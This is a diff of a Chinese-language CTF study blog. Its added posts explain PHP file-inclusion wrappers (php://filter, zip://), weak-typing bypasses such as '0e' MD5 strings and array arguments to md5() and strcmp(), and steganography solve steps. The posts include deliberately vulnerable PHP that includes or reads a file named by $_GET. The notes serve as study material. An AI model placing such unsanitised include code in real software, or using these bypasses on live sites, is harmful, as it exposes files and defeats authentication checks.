+<p>php:&#x2F;&#x2F;filter 伪协议组成：<br>read&#x3D;&lt;读链的筛选列表&gt;<br>resource&#x3D;&lt;要过滤的数据流&gt;<br>write&#x3D;&lt;写链的筛选列表&gt;<br>php:&#x2F;&#x2F;filter&#x2F;read&#x3D;处理方式（base64编码，rot13等等）&#x2F;resource&#x3D;要读取的文件</p>
+<p>read&#x3D;convert.base64-encode是将resource指向的内容进行转化,将其变成base64编码,并输出结果.这样处理后的输出不再是一个可执行的 PHP 文件，而是一个 Base64 编码的字符串。因此,可以直接被include_once给输出来</p>
+<p>read 对应要设置的过滤器：<br>常见的过滤器分字符串过滤器、转换过滤器、压缩过滤器、加密过滤器<br>其中convert.base64-encode ，convert.base64-decode都属于 转换过滤器</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=(<span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>]);</span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$a</span>));<span class="comment">//获取文件内容</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="zip-与bzip2-与zlib-协议"><a href="#zip-与bzip2-与zlib-协议" class="headerlink" title="zip:&#x2F;&#x2F;与bzip2:&#x2F;&#x2F;与zlib:&#x2F;&#x2F;协议"></a>zip:&#x2F;&#x2F;与bzip2:&#x2F;&#x2F;与zlib:&#x2F;&#x2F;协议</h3><p>zip:&#x2F;&#x2F; 等属于压缩流的协议，通过直接压缩普通文件为zip文件，再通过zip:&#x2F;&#x2F; 协议读取，可以直接执行php代码。压缩后的zip文件可以随意修改后缀也不影响zip:&#x2F;&#x2F;协议读取。（注意是如phpinfo.txt直接压缩为zip,而不是文件夹压缩zip）</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=(<span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>]);</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><strong>压缩及协议访问格式：</strong></p>
+<p>压缩文件为.zip后缀<br>zip:&#x2F;&#x2F;绝对路径&#x2F;phpinfo.zip%23phpinfo.php<br>压缩文件为.bz2后缀<br>compress.bzip2:&#x2F;&#x2F;绝对路径&#x2F;phpinfo.zip&#x2F;phpinfo.php<br>压缩文件为.gz后缀<br>compress.zlib:&#x2F;&#x2F;绝对路径&#x2F;phpinfo.zip&#x2F;phpinfo.php</p>
+<h3 id="include-once-file"><a href="#include-once-file" class="headerlink" title="include_once($file)"></a>include_once($file)</h3><p>返回值</p>
+<pre><code>如果文件成功包含，include_once 将会返回 1。
+如果文件没有被找到或者在尝试包含文件过程中有错误，include_once 不会返回任何值，但会产生一个警告（除非 error_reporting 被设置成忽略警告）。
+</code></pre>
+<p>各类文件类型的输出情况</p>
+<p>include_once 的参数不是一个 PHP 文件，那么该文件的内容会被直接输出（或执行，如果有可执行的 PHP 代码）到输出流中。具体的行为取决于该文件的内容和类型。</p>
+<pre><code>纯文本文件（比如 .txt）: 文件的内容会被直接输出。
+HTML 文件（比如 .html 或 .htm）: HTML 代码会被直接输出，浏览器会按照 HTML 来渲染。
+XML 文件或其他标记语言文件: 文件的内容会被直接输出。
+二进制文件（比如图片或者音频文件）: 这样做通常不是个好主意，因为二进制数据可能会被错误地解释为文本，导致输出乱码或产生不可预测的结果。
+包含 PHP 代码的非 PHP 文件: 如果文件中混合有 PHP 代码（即使文件扩展名不是 .php），那么那部分 PHP 代码仍然会被执行。
+</code></pre>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2024/12/19/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/" data-id="cm8a8wwbb0004mcvq2r3r7sa8" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-PHP弱类型" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2024/12/19/PHP%E5%BC%B1%E7%B1%BB%E5%9E%8B/" class="article-date">
+  <time class="dt-published" datetime="2024-12-19T12:07:09.758Z" itemprop="datePublished">2024-12-19</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="PHP弱类型"><a href="#PHP弱类型" class="headerlink" title="PHP弱类型"></a>PHP弱类型</h1><p>![](C:\Users\21649\Pictures\Screenshots\屏幕截图 2024-12-04 203915.png)</p>
+<p>PHP 是一种弱类型（也称为动态类型）的脚本语言。PHP 比较 2 个值是否相等可以用 “ &#x3D;&#x3D; ” 或 “ &#x3D;&#x3D;&#x3D; ”，“ &#x3D;&#x3D; ” 会在比较时自动转换类型而不改变原来的值，因此这个符号经常出现漏洞。如果遇到了 “&#x3D;&#x3D;&#x3D;” 则不会进行类型转换</p>
+<h2 id="null，0，“0”，array（），字母，进制的比较"><a href="#null，0，“0”，array（），字母，进制的比较" class="headerlink" title="null，0，“0”，array（），字母，进制的比较"></a>null，0，“0”，array（），字母，进制的比较</h2><p>![](C:\Users\21649\Pictures\Screenshots\屏幕截图 2024-12-04 210205.png)</p>
+<ol>
+<li>字母和数字进行弱类型比较时，字母会转换成”null”</li>
+<li>进制类的字符串在进行弱类型比较时会自动的转换成所对应的数字。</li>
+</ol>
+<p><strong>南邮web 起名字矛盾</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">noother_says_correct</span>(<span class="params"><span class="variable">$number</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">       <span class="variable">$one</span> = <span class="title function_ invoke__">ord</span>(<span class="string">&#x27;1&#x27;</span>);</span><br><span class="line">       <span class="variable">$nine</span> = <span class="title function_ invoke__">ord</span>(<span class="string">&#x27;9&#x27;</span>);</span><br><span class="line">       <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$number</span>); <span class="variable">$i</span>++)</span><br><span class="line">       &#123;   </span><br><span class="line">               <span class="variable">$digit</span> = <span class="title function_ invoke__">ord</span>(<span class="variable">$number</span>&#123;<span class="variable">$i</span>&#125;);<span class="comment">//ord是查询ascll码的函数。</span></span><br><span class="line">               <span class="keyword">if</span> ( (<span class="variable">$digit</span> &gt;= <span class="variable">$one</span>) &amp;&amp; (<span class="variable">$digit</span> &lt;= <span class="variable">$nine</span>) )</span><br><span class="line">               &#123;</span><br><span class="line">                       <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">               &#125;</span><br><span class="line">       &#125;</span><br><span class="line">          <span class="keyword">return</span> <span class="variable">$number</span> == <span class="string">&#x27;54975581388&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$flag</span>=<span class="string">&#x27;*******&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">noother_says_correct</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key&#x27;</span>]))</span><br><span class="line">   <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&#x27;access denied&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>54975581388转换成十六进制是0xccccccccc</p>
+<h2 id="超过精确度的弱类型问题"><a href="#超过精确度的弱类型问题" class="headerlink" title="超过精确度的弱类型问题"></a>超过精确度的弱类型问题</h2><p>超过精确度的数字（小数点后超过17位）在进行弱类型比较时，会出 现相等的情况。例如var_dump（0.99999999999999999&#x3D;&#x3D;1）的结果为 True。</p>
+<h2 id="in-array-函数"><a href="#in-array-函数" class="headerlink" title="in_array()函数"></a>in_array()函数</h2><p>in_array()函数的基本格式为：in_array（$search,Array()），表示搜索 $search是否为数组Array()的元素。in_array()函数实际上存在第三个参 数，该参数默认为false。如果第三个参数设置为true，则判断$search与 数组的值类型是否相同，即进行强类型比较；若第三个参数设置为 false，则in_array()函数进行判断的时候，会强制将$search的值转换为 数组的值类型，此时就是弱类型比较。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">bool</span> <span class="title function_ invoke__">in_array</span> ( <span class="keyword">mixed</span> <span class="variable">$needle</span> , <span class="keyword">array</span> <span class="variable">$haystack</span> [, <span class="keyword">bool</span> <span class="variable">$strict</span> = <span class="literal">FALSE</span> ] )</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2024/12/19/PHP%E5%BC%B1%E7%B1%BB%E5%9E%8B/" data-id="cm8a8wwba0003mcvq5ng404ba" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-PHP弱类型问题" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2024/12/19/PHP%E5%BC%B1%E7%B1%BB%E5%9E%8B%E9%97%AE%E9%A2%98/" class="article-date">
+  <time class="dt-published" datetime="2024-12-19T12:07:00.446Z" itemprop="datePublished">2024-12-19</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="PHP弱类型问题"><a href="#PHP弱类型问题" class="headerlink" title="PHP弱类型问题"></a>PHP弱类型问题</h1><p>首先，我们要明确PHP弱类型源于PHP本身就是弱类型语言，它不会严格检验变量的类型。变量可以不显式地声明其类型，而是在运行期间直接赋值。PHP中的等号（&#x3D;）有多种情况，具体表述如下：</p>
+<p> ❑&#x3D; 赋值。</p>
+<p> ❑&#x3D;&#x3D; 弱类型比较，先将两端的数据类型进行转换。</p>
+<p> ❑&#x3D;&#x3D;&#x3D; 强类型比较，不转换数据类型，直接比较。</p>
+<p> PHP的弱类型问题主要体现在两个变量之间进行弱类型比较（&#x3D;&#x3D;）的 时候：如果两个变量的类型不一致，就会对变量进行类型转换，变成同一类型，在这个转换过程中，会出现一些特殊情况。 下面，我们针对这些情况讲解CTF Web中常见的考点。</p>
+<h3 id="1-科学记数法与MD5值比较"><a href="#1-科学记数法与MD5值比较" class="headerlink" title="1.科学记数法与MD5值比较"></a>1.科学记数法与MD5值比较</h3><p>当字符串的格式为“0e+纯数字”时，例如0e12314，PHP会将其按科学记数法进行处理，计算结果一定是0。下面给出 几个示例。（注意等号个数！）</p>
+<p>![](C:\Users\asus\Pictures\Screenshots\屏幕截图 2024-12-04 210949.png)</p>
+<h4 id="考点分析"><a href="#考点分析" class="headerlink" title="考点分析"></a>考点分析</h4><p> 在CTF Web中，一般不会对科学记数法单独进行考查，而是会结合其 他函数（例如MD5函数）进行考查。通过之前的学习我们知道，MD5 值应该是唯一的（理论上），所以想找到两个MD5值相等的字符串是 非常困难的。但在结合科学记数法和弱类型的情况下，是存在相等这 种可能性的，具体代码如下：</p>
+<p>注：- MD5是一种消息摘要算法（Message - Digest Algorithm 5），在PHP中主要用于对数据（如字符串、文件内容等）进行加密（更准确地说是生成消息摘要）操作。它会将任意长度的数据转换为一个固定长度（128位，通常以32位十六进制字符串表示）的哈希值。</p>
+<p>![](C:\Users\asus\Pictures\Screenshots\屏幕截图 2024-12-05 145448.png)</p>
+<p>由于是弱类型比较（&#x3D;&#x3D;），因此可以考虑借助科学记数法进行 绕过，只要提交的字符串以0e开头，后面全是数字即可。</p>
+<p>![](C:\Users\asus\Pictures\Screenshots\屏幕截图 2024-12-05 145458.png)</p>
+<p>只要使用以上任意两个字符串，即可实现绕过。</p>
+<h5 id="还可以通过另一种方法实现绕过"><a href="#还可以通过另一种方法实现绕过" class="headerlink" title="还可以通过另一种方法实现绕过"></a>还可以通过另一种方法实现绕过</h5><p>原理：在PHP中，md5()函数只 能用于处理字符串。如果传递过来的数据类型无法被处理（例如数 组），那么md5()函数会返回NULL，导致出现NULL&#x3D;&#x3D;NULL的情况。</p>
+<p>![](C:\Users\asus\Pictures\Screenshots\屏幕截图 2024-12-05 151342.png)</p>
+<p>使用数组方式绕过md5()函数时，并不在意使用强类型比较还是弱类型比较，因为NULL&#x3D;&#x3D;NULL, NULL&#x3D;&#x3D;&#x3D;NULL，所以，在MD5比较中，数组方式应用得更广泛一些</p>
+<h3 id="2-科学记数法比较大小"><a href="#2-科学记数法比较大小" class="headerlink" title="2.科学记数法比较大小"></a>2.科学记数法比较大小</h3><p>一般都是设置输入数据的最大长度，然后给出一个更大的数（起码从长度上体现），然后做比较。</p>
+<p>比如：最大的3位数是几？</p>
+<p>答案并不是999</p>
+<p>这个数字可以更大，那就是9e9</p>
+<p>![](C:\Users\asus\Pictures\Screenshots\屏幕截图 2024-12-05 151753.png)</p>
+<p>其中time()函数是一个时间戳函数，其返回的数字并不是当前的时间，而是自UNIX纪元（格林威治时间1970年1月1日 00:00:00）起到当前时间的秒数。所以该数值的长度显然是大于4的。</p>
+<p>所以你就可以提交9e99</p>
+<h3 id="3-strcmp-函数问题"><a href="#3-strcmp-函数问题" class="headerlink" title="3.strcmp 函数问题"></a>3.strcmp 函数问题</h3><p>strcmp（str1, str2）函数用于对两个字符串进行比较。比较的规则是逐字节比较（根据其ASCII码来比较大小），如果str1&gt;str2，则返回值&gt;0；如果str1&lt;str2,则返回值&lt;0；如果str1&#x3D;str2，则返回0。类似C语言中的strcmp 函数。</p>
+<p>![](C:\Users\asus\Pictures\Screenshots\屏幕截图 2024-12-05 152649.png)</p>
+<p>$password变量通过GET请求进行赋值，请求参数为password,如果password参数的值等于’This is password’，那么就输出Right（strcmp的结果为0），否则就输出Wrong（strcmp的结果非 0）</p>
+<p>在实际的CTF Web题目中，假设让我们比较的字符串本身是未知的，strcmp()函数本身只能用于比较字符串，这时如果传递其他类型的数据（例如数组），就会导致函数出错，从而返回NULL （0）。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2024/12/19/PHP%E5%BC%B1%E7%B1%BB%E5%9E%8B%E9%97%AE%E9%A2%98/" data-id="cm8a8wwb80001mcvq4we93p3a" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-计算机基础" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2024/11/05/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/" class="article-date">
+  <time class="dt-published" datetime="2024-11-05T11:58:43.433Z" itemprop="datePublished">2024-11-05</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="window快捷键"><a href="#window快捷键" class="headerlink" title="window快捷键"></a>window快捷键</h1><p>CTRL+A全选</p>
+<p>CTRL+S保存</p>
+<p>CTRL+Z撤销</p>
+<p>CTRL+C复制</p>
+<p>CTRL+V粘贴</p>
+<p>CTRL+X剪切</p>
+<p>CTRL+SHIFT切换输入法</p>
+<p>WINDOW+E快速打开资源管理器</p>
+<p>WINDOW+D快速回到桌面</p>
+<p>CTRL+。中英文标点切换</p>
+<p>CTRL+[ 缩小字体</p>
+<p>CTRL+]放大字体</p>
+<p>CTRL+p打印</p>
+<h1 id="触摸板操作"><a href="#触摸板操作" class="headerlink" title="触摸板操作"></a>触摸板操作</h1><p>单手指：<br>单击→左键<br>两次单击→打开文件夹（也就是鼠标的连续按两次左键）<br>快速两次单击＋拖动可以移动文件夹位置（拖动图标）</p>
+<p>双指：<br>单击→右键、<br>按住→可以上下&#x2F;左右滑动窗口</p>
+<p>三指：<br>同时上下滑→回到桌面&#x2F;打开最小化的应用程序<br>同时左右滑→切换已打开的应用<br>同时点击→打开&#x2F;关闭搜索</p>
+<p>四指：<br>左右滑动切换不同桌面<br>单击→打开&#x2F;关闭通知栏</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2024/11/05/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/" data-id="cm8a8wwbh000cmcvq75aj0p3q" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-一周做题总结" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2024/11/01/%E4%B8%80%E5%91%A8%E5%81%9A%E9%A2%98%E6%80%BB%E7%BB%93/" class="article-date">
+  <time class="dt-published" datetime="2024-11-01T12:39:25.341Z" itemprop="datePublished">2024-11-01</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="一周做题总结"><a href="#一周做题总结" class="headerlink" title="一周做题总结"></a>一周做题总结</h1><h2 id="隐写"><a href="#隐写" class="headerlink" title="隐写"></a>隐写</h2><h3 id="你真的只能看到404吗（图片隐写）"><a href="#你真的只能看到404吗（图片隐写）" class="headerlink" title="你真的只能看到404吗（图片隐写）"></a>你真的只能看到404吗（图片隐写）</h3><p><strong>将图片拖入010直接搜索flag</strong></p>
+<h3 id="隐写（图片隐写）"><a href="#隐写（图片隐写）" class="headerlink" title="隐写（图片隐写）"></a>隐写（图片隐写）</h3><p>1先将图片拖入stegsolve进行data分析，选择三原色为0;</p>
+<p>2.寻找flag，如果找不到，点第三项，看是否转换成二维码</p>
+<h3 id="字里行间的秘密（文本隐写）"><a href="#字里行间的秘密（文本隐写）" class="headerlink" title="字里行间的秘密（文本隐写）"></a>字里行间的秘密（文本隐写）</h3><p>1.打开文件有一个txt的文本和一个加密的文档</p>
+<p>2.用CTRL+A全选然后复制文本，然后粘贴到零宽加密得到密码</p>
+<p>3.输入密码，发现word里面只有一行“恭喜你发现了密码”，此时考虑改变文字的颜色，使隐藏的文字显现出</p>
+<h3 id="大白（图片隐写）"><a href="#大白（图片隐写）" class="headerlink" title="大白（图片隐写）"></a>大白（图片隐写）</h3><p>1.当拿到图片时会感觉到图片缺少了一部分，图片并不完整</p>
+<p>2.将图片拖入了010，修改图片的长和宽</p>
+<h3 id="png的基本使用"><a href="#png的基本使用" class="headerlink" title="png的基本使用"></a>png的基本使用</h3><p>1.打开文件会发现三张图片</p>
+<p>2.第一张图片依照大白的解法，修改宽和高</p>
+<p>3.第二张图片使用stegslove，用data分析，三原色选0，选LSB，在第一行去发现信息</p>
+<p>4.第四张 图片使用010转成16进制，在文件的开头或者末尾去寻找信息</p>
+<h3 id="labyrinth"><a href="#labyrinth" class="headerlink" title="labyrinth"></a>labyrinth</h3><p>1.将图片拖入stegsolve，进行一帧帧的分析，会发现二维码</p>
+<h2 id="zip伪加密"><a href="#zip伪加密" class="headerlink" title="zip伪加密"></a>zip伪加密</h2><p>将文件拖入010修改00</p>
+<h2 id="编码转换"><a href="#编码转换" class="headerlink" title="编码转换"></a>编码转换</h2><p>熟练知道每个密码的特征，此次有biainfuck加密，JavaScript中的数组和字符串加密，ook加密</p>
+<h2 id="伪加密和图片隐写"><a href="#伪加密和图片隐写" class="headerlink" title="伪加密和图片隐写"></a>伪加密和图片隐写</h2><p>1.打开文件会发现一个图片和加密的zip文件，此时考虑图片隐写，将图片拖入stegsolve进行data分析，在第一行发现密码，注意密码的格式，将密码输入，得到一个伪加密的zip文件</p>
+<p>2.将文件拖入010修改00</p>
+<h2 id="掩码爆破"><a href="#掩码爆破" class="headerlink" title="掩码爆破"></a>掩码爆破</h2><h3 id="decompress"><a href="#decompress" class="headerlink" title="decompress"></a>decompress</h3><p>打开文件，发现有一个文本和一个加密的压缩包，文本的信息为^([a-z]){3}\d[a-z]$。即为密码：前三个字符为小写a到z，然后有一个字符为数字，最后为小写a到z</p>
+<p>1.本题用ARCHPR软件</p>
+<h2 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h2><h3 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h3><p>1.根据题目信息筛选dns流量，发现三条可以流量；</p>
+<p>2.查看流量可以发现三段字符串，将三段字符串整合成一段，16进制转ascll码，ascll码转base64，得到flag</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2024/11/01/%E4%B8%80%E5%91%A8%E5%81%9A%E9%A2%98%E6%80%BB%E7%BB%93/" data-id="cm8a8wwbc0006mcvq3xew233a" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-MISC" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2024/11/01/MISC/" class="article-date">
+  <time class="dt-published" datetime="2024-11-01T11:19:37.416Z" itemprop="datePublished">2024-11-01</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><p>ASCII编码</p>
 <ul>
-<li>根据偏移量的不同，还存在若干特定的恺撒密码名称：偏移量为10：Avocat(A→K)偏移量为13：ROT13偏移量为-5：Cassis (K 6)偏移量为-6：Cassette (K 7)</li>
+<li>控制字符（不可打印字符）：范围是0到31和127，十六进制对应0X00到0X1F和OX7E;</li>
+<li>可打印字符：范围是32到126，十六进制对应0X00到0X7E</li>
 </ul>
-<h3 id="维吉尼亚密码"><a href="#维吉尼亚密码" class="headerlink" title="维吉尼亚密码"></a>维吉尼亚密码</h3><ul>
-<li><p>维吉尼亚密码（又译维热纳尔密码）是使用一系列凯撒密码组成密码字母表的加密算法，属于多表密码的一种简单形式。维吉尼亚密码曾多次被发明。该方法最早记录在吉奥万·巴蒂斯塔·贝拉索（ Giovan Battista Bellaso）于1553年所著的书《吉奥万·巴蒂斯塔·贝拉索先生的密码》（意大利语：La cifra del. Sig. Giovan Battista Bellaso）中。然而，后来在19世纪时被误传为是法国外交官布莱斯·德·维吉尼亚（Blaise De Vigenère）所创造，因此现在被称为“维吉尼亚密码”。维吉尼亚密码以其简单易用而著称，同时初学者通常难以破解，因而又被称为“不可破译的密码”（法语：le chiffre indéchiffrable）。这也让很多人使用维吉尼亚密码来加密的目的就是为了将其破解。 [1]</p>
-</li>
-<li><p>![](C:\Users\21649\Pictures\Screenshots\屏幕截图 2024-10-27 172601.png)</p>
-</li>
-<li><p>例如，假设明文为：<br>ATTACKATDAWN<br>选择某一关键词并重复而得到密钥，如关键词为LEMON时，密钥为：<br>LEMONLEMONLE<br>对于明文的第一个字母A，对应密钥的第一个字母L，于是使用表格中L行字母表进行加密，得到密文第一个字母L。类似地，明文第二个字母为T，在表格中使用对应的E行进行加密，得到密文第二个字母X。以此类推，可以得到：<br>明文：ATTACKATDAWN密钥：LEMONLEMONLE密文：LXFOPVEFRNHR<br>解密的过程则与加密相反。例如：根据密钥第一个字母L所对应的L行字母表，发现密文第一个字母L位于A列，因而明文第一个字母为A。密钥第二个字母E对应E行字母表，而密文第二个字母X位于此行T列，因而明文第二个字母为T。以此类推便可得到明文。</p>
-</li>
+<h2 id="Base64编码"><a href="#Base64编码" class="headerlink" title="Base64编码"></a>Base64编码</h2><ul>
+<li>一个字节的范围是0到255，其中0到31和127和255是不可打印字符</li>
 </ul>
-<h3 id="培根密码"><a href="#培根密码" class="headerlink" title="培根密码"></a>培根密码</h3><ul>
-<li>![](C:\Users\21649\Pictures\Screenshots\屏幕截图 2024-10-27 173220.png)</li>
-</ul>
-<p>加密者需使用两种不同字体，分别代表A和B。准备好一篇包含相同AB字数的假信息后，按照密文格式化假信息，即依密文中每个字母是A还是B分别套用两种字体。解密时，将上述方法倒转。所有字体一转回A，字体二转回B，以后再按上表拼回字母。法兰西斯·培根另外准备了一种方法，其将大小写分别看作A与B，可用于无法使用不同字体的场合（例如只能处理纯文本时）。但这样比起字体不同更容易被看出来，而且和语言对大小写的要求也不太兼容。培根密码本质上是将二进制信息通过样式的区别，加在了正常书写之上。培根密码所包含的信息可以和用于承载其的文章完全无关。</p>
-<h3 id="栅栏密码"><a href="#栅栏密码" class="headerlink" title="栅栏密码"></a>栅栏密码</h3><p>①把将要传递的信息中的字母交替排成上下两行。</p>
-<p>②再将下面一行字母排在上面一行的后边，从而形成一段密码。</p>
-<p>③例如：明文：THE LONGEST DAY MUST HAVE AN END加密：</p>
-<p>1、把将要传递的信息中的字母交替排成上下两行。</p>
-<p>T E O G S D Y U T A E N N</p>
-<p>H L N E T A M S H V A E D</p>
-<p>2、 密文：将下面一行字母排在上面一行的后边。</p>
-<p>TEOGSDYUTAENN </p>
-<p>HLNETAMSHVAED</p>
-<p>解密：先将密文分为两行</p>
-<p>T E O G S D Y U T A E N N</p>
-<p>H L N E T A M S H V A E D</p>
-<p>再按上下上下的顺序组合成一句话明文：THE LONGEST DAY MUST HAVE AN END</p>
-<h3 id="希尔密码"><a href="#希尔密码" class="headerlink" title="希尔密码"></a>希尔密码</h3><h2 id="base密码"><a href="#base密码" class="headerlink" title="base密码"></a>base密码</h2><h3 id="base16"><a href="#base16" class="headerlink" title="base16"></a>base16</h3><ul>
-<li><p>base16编码也称为十六进制编码或Hex编码，是一种将二进制数据表示为十六进制数字和字符的方法。它使用16个字符（0-9和A-F）来表示4位二进制数的每个组合。</p>
-</li>
-<li><p>编码原理：由于4bit就可以表示2^4 &#x3D; 16个字符。所以用4bit可以表示所有的十六进制数。</p>
-<p>1byte＝8bit 所以1byte &#x3D; 俩个十六进制数据。</p>
-</li>
-<li><p>![](C:\Users\21649\Pictures\Screenshots\屏幕截图 2024-10-27 174508.png)</p>
-</li>
-</ul>
-<p>将二进制数据分割为4个一组，将每四位二进制数据映射到对应的base16字符，一一对应，若二进制数据不是4的倍数，就在后面填充0。</p>
-<h3 id="base32"><a href="#base32" class="headerlink" title="base32"></a>base32</h3><ul>
-<li><p>Base32编码是一种将二进制数据转换为使用32个不同字符表示的文本编码方式</p>
-<p>由于5bit就可以表示2^5 &#x3D; 32个字符。<br>所以base32就是将二进制数据分割成5个一组，如果结尾不满足5的倍数，就用“&#x3D;”填充，之后再根据base32索引表，进行编码。</p>
-<p>![](C:\Users\21649\Pictures\Screenshots\屏幕截图 2024-10-27 174846.png)</p>
-</li>
-</ul>
-<h3 id="base64"><a href="#base64" class="headerlink" title="base64"></a>base64</h3><p>1）原理：<br>1.准备要编码的二进制数据： 将要编码的二进制数据准备好，通常是字节的形式。<br>2.分组： 将二进制数据分成固定大小的组，每组通常为3字节（24位）。如果最后一组不足3字节，通常需要进行填充，以便每组都有3字节。<br>3.将每个组的二进制数据转换为十进制： 将每个3字节的二进制数据视为一个8bit*3&#x3D;24bit位的二进制整数，再转化为一个十进制整数。<br>4.Base64编码： 将每个十进制整数编码为Base64字符。</p>
-<p>1）Base64字符集通常包括64个字符，通常是大写字母A到Z、小写字母a到z、数字0到9以及两个额外的字符（通常是”+”和”&#x2F;“）。<br>2）以24位整数为例，将它分成4组，每组6位。这4组6位整数将被编码为4个Base64字符。<br>3）每个6位整数对应一个Base64字符，根据其在Base64字符集中的位置来选择。<br>4）如果原始数据不足3字节，会添加一个或两个额外的0位，以确保每个6位整数都有6位。<br>5）Base64编码的结果是一个文本字符串，其中包含一系列Base64字符，每4个字符分为一组，每组表示一个24位整数。<br>5.填充（可选）： 如果原始数据的长度不是3的倍数，可以使用一个或两个填充字符“&#x3D;”来补全Base64编码，以确保编码长度是4的倍数。<br>最终，Base64编码的结果就是表示输入二进制数据的文本字符串。在解码时，可以根据相同的算法将Base64编码的文本字符串还原为原始的二进制数据。</p>
-<p>![](C:\Users\21649\Pictures\Screenshots\屏幕截图 2024-10-27 175054.png)</p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2024/10/27/%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/" data-id="cm2rexbdw0000qwvqg9f22l99" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
